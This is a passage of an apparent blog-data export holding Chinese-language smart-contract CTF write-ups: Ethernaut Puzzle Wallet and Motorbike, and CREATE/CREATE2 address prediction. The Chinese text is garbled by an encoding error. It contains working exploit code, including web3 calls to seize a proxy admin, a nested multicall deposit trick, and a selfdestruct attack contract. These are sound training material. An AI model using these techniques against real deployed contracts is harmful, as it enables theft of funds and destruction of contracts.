attack&#123;&#125;\n\nä½¿ç”¨è¯¥åˆçº¦è¿›è¡Œæ”»å‡»ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ•°å­¦é—®é¢˜äº†\n24.Puzzle Wallet\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nNowadays, paying for DeFi operations is impossible, fact.\nA group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.\nThey needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\nLittle did they know, their lunch money was at riskâ€¦\n Youâ€™ll need to hijack this wallet to become the admin of the proxy.\n Things that might help::\n\nUnderstanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.\nKnowing about proxy patterns and the way they handle storage variables.\n\nCode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy &#123;\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;\n        admin = _admin;\n    &#125;\n\n    modifier onlyAdmin &#123;\n      require(msg.sender == admin, \"Caller is not the admin\");\n      _;\n    &#125;\n\n    function proposeNewAdmin(address _newAdmin) external &#123;\n        pendingAdmin = _newAdmin;\n    &#125;\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    &#125;\n\n    function upgradeTo(address _newImplementation) external onlyAdmin &#123;\n        _upgradeTo(_newImplementation);\n    &#125;\n&#125;\n\ncontract PuzzleWallet &#123;\n    using SafeMath for uint256;\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address => bool) public whitelisted;\n    mapping(address => uint256) public balances;\n\n    function init(uint256 _maxBalance) public &#123;\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyWhitelisted &#123;\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    &#125;\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;\n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      maxBalance = _maxBalance;\n    &#125;\n\n    function addToWhitelist(address addr) external &#123;\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    &#125;\n\n    function deposit() external payable onlyWhitelisted &#123;\n      require(address(this).balance &lt;= maxBalance, \"Max balance reached\");\n      balances[msg.sender] = balances[msg.sender].add(msg.value);\n    &#125;\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;\n        require(balances[msg.sender] >= value, \"Insufficient balance\");\n        balances[msg.sender] = balances[msg.sender].sub(value);\n        (bool success, ) = to.call&#123; value: value &#125;(data);\n        require(success, \"Execution failed\");\n    &#125;\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;\n        bool depositCalled = false;\n        for (uint256 i = 0; i &lt; data.length; i++) &#123;\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly &#123;\n                selector := mload(add(_data, 32))\n            &#125;\n            if (selector == this.deposit.selector) &#123;\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            &#125;\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeè¿™é“é¢˜åˆ‡å…¥ç‚¹å°±æ˜¯UpgradeableProxyåˆçº¦ï¼ŒçŽ°åœ¨å·²ç»æ›´åä¸ºERC1967Upgradeã€‚è¿™é“é¢˜å­˜åœ¨æ§½ç¢°æ’žï¼ŒpendingAdminå’Œowneræ—¶é€šè¿‡ä¸€ä¸ªæ’æ§½ï¼Œæ‰€ä»¥ä¿®æ”¹pendingAdminç›´æŽ¥å°±æ˜¯ä¿®æ”¹äº†ownerã€‚å¯ä»¥äº†è§£ä¸€ä¸‹ERC1967Upgradeæ¥è®¤è¯†è¿™ä¸€ç‚¹ã€‚\nè™½ç„¶åˆçº¦ä¸­çš„proposeNewAdminä¸å¯ä»¥ç›´æŽ¥è°ƒç”¨ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡web3æ¥å‘é€äº¤æ˜“\ndata&#x3D;selector+other\nè¿è¡Œä¹‹åŽownerå˜æˆäº†è‡ªå·±ï¼Œå†ä¸ºè‡ªå·±æ·»åŠ ç™½åå•å³å¯\nè¦åŠ«æŒè¿™ä¸ªé’±åŒ…å°±è¦æˆä¸ºadminï¼Œè€ŒçŽ°åœ¨å¯ä»¥æ”¹å˜adminçš„åœ°æ–¹åªæœ‰setMaxBalanceï¼Œè€Œè¿™ä¸ªå‡½æ•°è¦æ±‚åˆçº¦ä½™é¢ä¸º0ï¼Œå¯ä»¥ä½¿åˆçº¦ä½™é¢å‡å°‘çš„åœ°æ–¹åˆåªæœ‰execute()å‡½æ•°ï¼Œè¿™é‡Œåªèƒ½åŽ»èµ°å­˜å…¥çš„é‡‘é¢ï¼Œåˆçº¦å°†è‡³å°‘æœ‰0.001 etherï¼Œä½†æ˜¯multicallä½¿ç”¨äº†forå¾ªçŽ¯è°ƒç”¨ï¼Œå¦‚æžœè¿™é‡Œå¯ä»¥å¤šæ¬¡è°ƒç”¨deposité‚£å°±å¯ä»¥éšæ„å¢žåŠ è‡ªå·±çš„balancesï¼Œä½†æ˜¯æ˜¾ç„¶è¿™é‡Œé™åˆ¶äº†åªèƒ½è°ƒç”¨ä¸€æ¬¡deposit()å‡½æ•°ã€‚\næ­¤å¤„çœ‹ä¼¼ä¸¥è°¨ï¼Œä½†æ˜¯å¦‚æžœæˆ‘ä»¬å¯ä»¥å°†deposit()å‡½æ•°å°è£…åˆ°é›¶ä¸€ä¸ªå‡½æ•°å°±å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚æ‰€ä»¥æž„é€ data[deposit(),multicall(deposit())],è¿™æ ·æ—¢å¯ç»•è¿‡æ£€æµ‹è¿žç»­è°ƒç”¨ä¸¤æ¬¡depositï¼Œå°±å¯ä»¥è¾¾åˆ°ç”¨0.001 etherå……å€¼0.002 etherçš„æ•ˆæžœå–èµ°åˆçº¦çš„ä½™é¢ï¼Œè°ƒç”¨setbalance()å‡½æ•°ï¼Œå‚æ•°ä¸ºè‡ªå·±åœ°å€ï¼Œå³å¯åŠ«æŒé’±åŒ…ã€‚\nAttackèŽ·å¾—owner\nweb3.eth.abi.encodeFunctionSignature(\"proposeNewAdmin(address)\");\nweb3.eth.abi.encodeParameter(\"address\", player);\nå†æ‹¼æŽ¥å¾—åˆ°data\nawait web3.eth.sendTransaction(&#123;from: player, to: instance, data&#125;)\n\nå¢žåŠ balances\ndata1 = web3.eth.abi.encodeFunctionSignature(\"deposit()\");\n\ndata3=web3.eth.abi.encodeParameter('bytes[]', [data1]);\n\ndata2 = eb3.eth.abi.encodeFunctionSignature(\"multicall(bytes[])\");\n\ndata4=data2+data3\n\nawait contract.multicall([data1, data3], &#123; value: toWei('0.001') &#125;);\n\nèŽ·å¾—admin\nawait contract.setMaxBalance('player')\n\n25.Motorbike\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šdestory the engine of the motorbike\nCode// SPDX-License-Identifier: MIT\n\npragma solidity &lt;0.7.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/Initializable.sol\";\n\ncontract Motorbike &#123;\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    \n    struct AddressSlot &#123;\n        address value;\n    &#125;\n    \n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public &#123;\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    &#125;\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual &#123;\n        // solhint-disable-next-line no-inline-assembly\n        assembly &#123;\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 &#123; revert(0, returndatasize()) &#125;\n            default &#123; return(0, returndatasize()) &#125;\n        &#125;\n    &#125;\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`. \n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual &#123;\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    &#125;\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;\n        assembly &#123;\n            r_slot := slot\n        &#125;\n    &#125;\n&#125;\n\ncontract Engine is Initializable &#123;\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot &#123;\n        address value;\n    &#125;\n\n    function initialize() external initializer &#123;\n        horsePower = 1000;\n        upgrader = msg.sender;\n    &#125;\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    &#125;\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view &#123;\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    &#125;\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal &#123;\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) &#123;\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        &#125;\n    &#125;\n    \n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private &#123;\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        \n        AddressSlot storage r;\n        assembly &#123;\n            r_slot := _IMPLEMENTATION_SLOT\n        &#125;\n        r.value = newImplementation;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®è¦æ±‚ä½¿ç”¨selfdestructæ–¹æ³•å›žè°ƒengineï¼Œå°è¯•è¿‡åœ¨proxyä¸­æ›´æ–°é€»è¾‘åˆçº¦åœ°å€ï¼Œä½†ç”±äºŽengineå†…çš„åˆå§‹åŒ–å‡½æ•°åœ¨å…³å¡åˆ›å»ºæ—¶å€™å·²ç»è¢«è°ƒç”¨ï¼Œupgraderå˜é‡ä¸èƒ½å†è¢«æ›´æ”¹ï¼Œå°è¯•äº†ç›´æŽ¥æ›´æ”¹å­˜å‚¨addressçš„slotï¼Œä½†æ˜¯é€»è¾‘åˆçº¦ä¸­çš„ä¸€åˆ‡å¯ä»¥ä¿®æ”¹å¯¹åº”å‚æ•°çš„å‡½æ•°å‡è¢«é™åˆ¶ï¼Œmodiferæˆ–internalä»¥åŠprivate\næœ€ç»ˆæ£€æŸ¥é€»è¾‘å’Œæœˆä¸­åˆå§‹åŒ–å‡½æ•°å¹¶æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œå¯ä»¥è‡ªè¡Œè°ƒç”¨ä½¿é€»è¾‘åˆçº¦çš„upgraderå˜æˆæ”»å‡»åˆçº¦ï¼Œä»Žè€Œè°ƒç”¨upgradeandcallå‡½æ•°ï¼Œè°ƒç”¨å…¶ä¸­çš„selfdestructå‡½æ•°æ¯æŽ‰å¼•æ“Ž\nAttackcontract attack&#123;\n    address public tar=0xeEA18Bb1788a7C81488Cbd89A75C7e4DF86dBb89;\n    constructor()public&#123;\n        tar.call(abi.encodeWithSignature(\"initialize()\"));\n    &#125;\n    pwncon public pwnaddr=new pwncon();\n    bytes4 public selecet=pwnaddr.des.selector;\n    function upandcall(address a,bytes calldata data)public&#123;\n        tar.call(abi.encodeWithSignature(\"upgradeToAndCall(address,bytes)\",a,data));\n    &#125;\n&#125;\ncontract pwncon&#123;\n    function des()external payable&#123;\n        selfdestruct(payable(msg.sender));\n    &#125;\n&#125;\n\n","slug":"ethernaut","date":"2022-08-02T02:42:37.160Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"e5737740b784095b2d07fd3a962c9c2b","title":"Understand create and create2 algorithms according to two challenges","content":"0x00 åˆçº¦åœ°å€è®¡ç®—åˆçº¦åœ°å€æŒ‰ç…§ä¸€å®šçš„è§„å¾‹è®¡ç®—è€Œæ¥ï¼Œæ‰€ä»¥åœ¨åˆçº¦éƒ¨ç½²ä¹‹å‰å³å¯è®¡ç®—å‡ºåˆçº¦åœ°å€ã€‚\n åœ°å€è®¡ç®—æœ‰ä¸¤ç§æ–¹å¼\n \n\n\n\n\n\n\n\n\n\n\n\nCreate : Web3.sha3(rlp.encode(deployingAddress, nonce))[12:]\nCreate2 : Web3.keccak(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]\n\n[sha3å’Œkeccak256ç›¸åŒ]\n0x01 createæ–¹æ³•ä»¥å¤ªåŠåˆçº¦çš„åœ°å€æ˜¯æ ¹æ®åˆ›å»ºè€…ï¼ˆsenderï¼‰çš„åœ°å€ä»¥åŠåˆ›å»ºè€…å‘é€è¿‡çš„äº¤æ˜“æ•°é‡ï¼ˆnonceï¼‰æ¥è®¡ç®—ç¡®å®šçš„ã€‚ senderå’Œnonce è¿›è¡ŒRLPç¼–ç ï¼Œç„¶åŽç”¨Keccak-256 è¿›è¡Œhashè®¡ç®—ã€‚\nè®¡ç®—åœ°å€çš„pythonä»£ç å¦‚ä¸‹\nfrom web3 import Web3,HTTPProvider\nimport rlp\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))//ä»¥ropstenç½‘ç»œè¿›è¡Œæµ‹è¯•\n\ndef getnonce(addr):\n    return w3.eth.getTransactionCount(Web3.toChecksumAddress(hex(addr)))//æ­¤å¤„åœ°å€ä½¿ç”¨åå…­è¿›åˆ¶\n    \ndef getaddress(sender,nonce):\n    return (Web3.sha3(rlp.encode([addr, nonce]))[12:].hex())//æ³¨æ„æ­¤å¤„ä½¿ç”¨çš„æ˜¯åœ°å€çš„åè¿›åˆ¶\n    //è®¡ç®—æ•°æ®æ€»å…±æœ‰64ä½ï¼Œå–åŽ40ä½ä¸ºåœ°å€\n\naddr=éƒ¨ç½²åˆçº¦çš„msg.senderã€‚å¦‚æžœæ˜¯åˆçº¦ä¸­éƒ¨ç½²çš„newåˆçº¦ï¼Œåˆ™ä¸ºåˆçº¦åœ°å€\nnonce=getnonce(addr)//èŽ·å¾—äº¤æ˜“æ•°é‡nonceæ³¨æ„èŽ·å¾—çš„nonceæ˜¯ä¸‹ä¸€æ¬¡äº¤æ˜“çš„nonceï¼Œå¹¶éžæœ¬æ¬¡\nprint(nonce)\n\ngetnextaddress=getaddress(addr,nonce)\nprint(getnextaddress)//å¾—åˆ°ä¸‹ä¸€ä¸ªéƒ¨ç½²çš„åˆçº¦çš„åœ°å€\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šæ ¹æ®EIP 161 è§„èŒƒåˆçº¦å¸æˆ·ä½¿ç”¨ nonce&#x3D;1 åˆå§‹ï¼ˆåœ¨ä¸»ç½‘ç»œä¸Šï¼‰ã€‚ å› æ­¤ï¼Œç”±ä¸€ä¸ªåˆçº¦åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦åœ°å€å°†ä½¿ç”¨éžé›¶nonceè¿›è¡Œè®¡ç®—ã€‚\nä»¥ä¸‹è¿›è¡Œæµ‹è¯•ï¼š\næµ‹è¯•ä¸€ï¼Œä½¿ç”¨metamaskè´¦æˆ·ç›´æŽ¥éƒ¨ç½²è¿è¡Œpythonæ–‡ä»¶èŽ·å¾—å¦‚ä¸‹å†…å®¹\n\nå³ä¸‹ä¸€ç¬”äº¤æ˜“å°†æ˜¯ç¬¬294ï¼Œå¹¶ä¸”ä¸‹ä¸€ä¸ªåˆçº¦åœ°å€å°†æ˜¯0x22a21fc272921b6de75320422e3ef44ad3a9fca3\nåœ¨remixç¼–è¯‘å™¨ä¸­éƒ¨ç½²ä¸€ä¸ªæ–°çš„åˆçº¦ï¼ŒæŸ¥çœ‹åˆçº¦åœ°å€å¦‚ä¸‹\n\nå¯ä»¥å‘çŽ°ï¼Œåˆçº¦åœ°å€å’Œè®¡ç®—çš„åœ°å€æ˜¯ç›¸åŒçš„ã€‚\næ‰€éƒ¨ç½²åˆçº¦æºç ï¼ˆä¸ºæµ‹è¯•äºŒå‡†å¤‡ï¼‰\ncontract b &#123;\n\t//empty\n\t&#125;\ncontract a &#123;\n\t\n    b public target;\n\n    constructor(address _ctfLauncher, address _player) public payable\n    &#123;\n        target = new b();\n    &#125;\n    &#125;\n\næµ‹è¯•äºŒï¼Œåˆçº¦ä¸­éƒ¨ç½²æ–°çš„åˆçº¦è®¡ç®—æ–¹æ³•å’Œæµ‹è¯•ä¸€ä¸­çš„æ–¹æ³•ä¸€æ ·ï¼Œä¸è¿‡nonceå¤„å­˜åœ¨ä¸åŒã€‚\næ ¹æ®EIP 161è§„å®šï¼Œç”±ä¸€ä¸ªåˆçº¦åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦åœ°å€å°†ä½¿ç”¨éžé›¶nonceè¿›è¡Œè®¡ç®—å³nonce&#x3D;1ã€‚\næ–¹ä¾¿èµ·è§ï¼Œç›´æŽ¥è®¡ç®—æµ‹è¯•ä¸€ä¸­çš„targetåœ°å€\n\nåˆçº¦åœ¨éƒ¨ç½²æ—¶å€™æ–°å»ºäº†new båˆçº¦ï¼Œæ‰€ä»¥addråº”ä¸ºåˆçº¦åœ°å€\n\nè¿è¡Œå¾—åˆ°ç»“æžœ\n\næŸ¥çœ‹åˆçº¦ä¸­åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œå¯è§è®¡ç®—æ­£ç¡®\n\n0x02  create2æ–¹æ³•CREATE2 ä¸å†ä¾èµ–äºŽè´¦æˆ·çš„ nonceï¼Œè€Œæ˜¯å¯¹ä»¥ä¸‹å‚æ•°è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—å‡ºæ–°çš„åœ°å€ï¼š\n\nåˆçº¦åˆ›å»ºè€…çš„åœ°å€ï¼ˆaddress)\nä½œä¸ºå‚æ•°çš„æ··æ·†å€¼ï¼ˆsaltï¼‰\nåˆçº¦åˆ›å»ºä»£ç  (init_code)\n\nå‚è€ƒEIP 1014\nå…·ä½“çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š\nWeb3.sha3(0xff ++ address ++ salt ++ keccak256(init_code))[12:]\n\næ³¨æ„ï¼šâ‘ æ­¤å¤„çš„++æŒ‡çš„æ˜¯å­—èŠ‚çš„æ‹¼æŽ¥è€Œä¸æ˜¯æ•°å­—åŠ å‡æ‰€ä»¥é¡ºåºä¸å¯æ‰“ä¹±â‘¡addressä¸ºæ‰§è¡Œdeployå‡½æ•°ï¼ˆè§ä¸‹æ–‡éƒ¨ç½²åˆçº¦ä»£ç ï¼‰çš„åˆçº¦åœ°å€\nè®¡ç®—åœ°å€çš„pythonä»£ç å¦‚ä¸‹\ndeployingAddr='address without 0x'\ns=Web3.keccak(hexstr=code)\na=''.join(['%02x' % b for b in s])\nsalt=hex(i)[2:].rjust(64,'0')//iä¸ºéšæœºæ•°\np=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n\nè®¡ç®—åœ°å€çš„solidityä»£ç å¦‚ä¸‹\nfunction getAddress(address addr, bytes memory bytecode, uint salt) public view returns (address) &#123;\n    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff),addr,salt,keccak256(bytecode)));\n    return address(uint160(uint256(hash)));\n&#125;\n\nä½¿ç”¨saltè¿›è¡ŒæŒ‡å®šåœ°å€çš„åˆçº¦éƒ¨ç½²ä»£ç å¦‚ä¸‹\ncontract Deployer &#123;\n    // contractBytecodeæ˜¯å¾…éƒ¨ç½²åˆçº¦çš„bytecode\n    address public a;\n    bytes code = hex\"your code\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\n\n\n0x03  è§£é¢˜ç»ƒä¹ createç»ƒä¹ é¢˜ç›®åœ°å€ï¼šblockchain-ctfç¬¬åä¸€é¢˜Rainy Day Fund\né¢˜ç›®ä»£ç \npragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer&#123;\n    \n    bool public debugMode;\n\n    constructor() public payable&#123;\n        if(address(this).balance == 1.337 ether)&#123;\n            debugMode=true;\n        &#125;\n    &#125;\n&#125;\n\ncontract RainyDayFund is CtfFramework&#123;\n\n    address public developer;\n    mapping(address=>bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    &#125;\n    \n    modifier isManager() &#123;\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n         _;\n    &#125;\n\n    function () external payable ctf&#123;\n        // Anyone can add to the fund    \n    &#125;\n    \n    function addFundManager(address _newManager) external isManager ctf&#123;\n        fundManagerEnabled[_newManager] = true;\n    &#125;\n\n    function removeFundManager(address _previousManager) external isManager ctf&#123;\n        fundManagerEnabled[_previousManager] = false;\n    &#125;\n\n    function withdraw() external isManager ctf&#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\né¢˜ç›®è¦æ±‚å¾ˆç®€å•å°±æ˜¯è¦å·èµ°é¢˜ç›®ä¸­çš„æ‰€æœ‰åˆçº¦ï¼Œä½†æ˜¯å–èµ°é¢˜ç›®åˆçº¦ä¸­çš„éœ€è¦è°ƒç”¨withdrawå‡½æ•°ï¼Œè¯¥å‡½æ•°è¦æ±‚ismanagerçš„è¦æ±‚ï¼ŒæŸ¥çœ‹ä¿®é¥°å†…å®¹ï¼ŒfundManagerEnabled[msg.sender]å’Œmsg.sender &#x3D;&#x3D; developerä¸èƒ½ä¿®æ”¹ï¼Œå”¯ä¸€çš„å…¥å£æ˜¯debugAuthorizer.debugMode()ï¼Œè€ŒDebugAuthorizerä¸­çš„åˆ¤æ–­åªåœ¨æž„é€ æ—¶æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»è¦é¢„æµ‹è¯¥åˆçº¦åœ°å€ã€‚\nä½¿ç”¨createè®¡ç®—æ–¹æ³•æ ¹æ®developerå’Œnonceè®¡ç®—åˆçº¦åœ°å€ï¼Œå†æ ¹æ®åˆçº¦åœ°å€å’Œnonceè®¡ç®—new DebugAuthorizer()ï¼Œè½¬å…¥1.337 etherå³å¯\n\n\nåœ¨è¿›è¡Œwithdrawå³å¯é€šå…³\ncreate2ç»ƒä¹ é¢˜ç›®åœ°å€ï¼šcapture the etherâ€“Fuzzy identity\né¢˜ç›®ä»£ç \npragma solidity ^0.4.21;\n\ninterface IName &#123;\n    function name() external view returns (bytes32);\n&#125;\n\ncontract FuzzyIdentityChallenge &#123;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(isSmarx(msg.sender));\n        require(isBadCode(msg.sender));\n\n        isComplete = true;\n    &#125;\n\n    function isSmarx(address addr) internal view returns (bool) &#123;\n        return IName(addr).name() == bytes32(\"smarx\");\n    &#125;\n\n    function isBadCode(address _addr) internal pure returns (bool) &#123;\n        bytes20 addr = bytes20(_addr);\n        bytes20 id = hex\"000000000000000000000000000000000badc0de\";\n        bytes20 mask = hex\"000000000000000000000000000000000fffffff\";\n\n        for (uint256 i = 0; i &lt; 34; i++) &#123;\n            if (addr &amp; mask == id) &#123;\n                return true;\n            &#125;\n            mask &lt;&lt;= 4;\n            id &lt;&lt;= 4;\n        &#125;\n\n        return false;\n    &#125;\n&#125;\n\né¢˜ç›®è¦æ±‚ä½¿isComplete &#x3D; trueï¼Œå³ä½¿msg.senderåˆçº¦ä¸­publicå­˜å‚¨å˜é‡nameä¸ºbytes32(â€œsmarxâ€)ï¼Œå¹¶ä¸”åˆçº¦åœ°å€ä¸­æœ‰badc0deå­—ç¬¦\nä½¿ç”¨createè®¡ç®—æ–¹æ³•çˆ†ç ´saltèŽ·å¾—å«æœ‰æŒ‡å®šå­—ç¬¦çš„åœ°å€ï¼Œçˆ†ç ´ä»£ç å¦‚ä¸‹\nfrom web3 import Web3,HTTPProvider\n\ndeployingAddr='2bA2D4a1B728D87E9319ce51B3F5086a78f945d9'\n\ncode='60806040527f736d61727800000000000000000000000000000000000000000000000000000060005573553c7e7d4ba3f92d85c009cacb2b995d9e3c79b7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610119806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806306fdde03146037578063dd365b8b146053575b600080fd5b603d605b565b6040518082815260200191505060405180910390f35b60596061565b005b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801560ca57600080fd5b505af115801560dd573d6000803e3d6000fd5b5050505056fea2646970667358221220434aa07aa1939601b3982d4fefcf99b542f6bc06572ed87993a90d2ff7cf687c64736f6c63430006000033'\n\n//å¾…éƒ¨ç½²åˆçº¦çš„bytecode\n\ns=Web3.keccak(hexstr=code)\n\na=''.join(['%02x' % b for b in s])//å°†sè½¬å˜ä¸ºå­—èŠ‚\n\ni=0\n\nwhile(1):\n    salt=hex(i)[2:].rjust(64,'0')\n    print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    if 'badc0de' in p:\n        print(salt,p)\n        break\n    i+=1\n\n\nä½¿ç”¨çˆ†ç ´å‡ºçš„saltéƒ¨ç½²INameåˆçº¦ï¼Œå†é€šè¿‡éƒ¨ç½²çš„åˆçº¦è°ƒç”¨é¢˜ç›®ä¸­çš„authenticate()å‡½æ•°å³å¯é€šå…³\n\n","slug":"Understand create and create2 algorithms according to two challenges","date":"2022-08-02T02:38:41.514Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"6aeab2a5cd77c3106ff796f4ea68ab90","title":"Find abnormal transactions","content":"ä¸€é“æ–°é¢–çš„åŒºå—é“¾å®‰å…¨æ–¹å‘ctfé¢˜ç›®ï¼Œäº¤æ˜“è¯¦æƒ…ï¼šhttps://kovan.etherscan.io/address/0x16537776395108789FE5cC5420545CAb210a7D30\n\n\ncode\n\n\n\n\n\n\n\n\né¢˜ç›®æè¿°ï¼š\nThe funds are lost somewhere on this platform. Find the missing funds from draftdown labs. We need it to fund our mission. Use our script to validate the transaction.Note: No brute force or fuzzing is needed for the search! Just use your eyes.Use CYBERLEAGUE{} flag format\nOur motherland have engaged a vendor to develop smart contract embedded in our fuel tank. We wanna make sure that the amount of fuel is recorded in an immutable blockchain. (In russian) Chert by pobral etikh idiotov! The smart contract is broken and our funds are stolen. Investigate and find out the culprite immediately! \\r\\nSmart contract link: https://kovan.etherscan.io/address/0x16537776395108789FE5cC5420545CAb210a7D30&quot;\npragma solidity ^0.8.0;\n\ninterface IERC20 &#123;\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\nlibrary Address &#123;\n\n    function isContract(address account) internal view returns (bool) &#123;\n        return account.code.length > 0;\n    &#125;\n\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call&#123;value: amount&#125;(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    &#125;\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n        return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        return 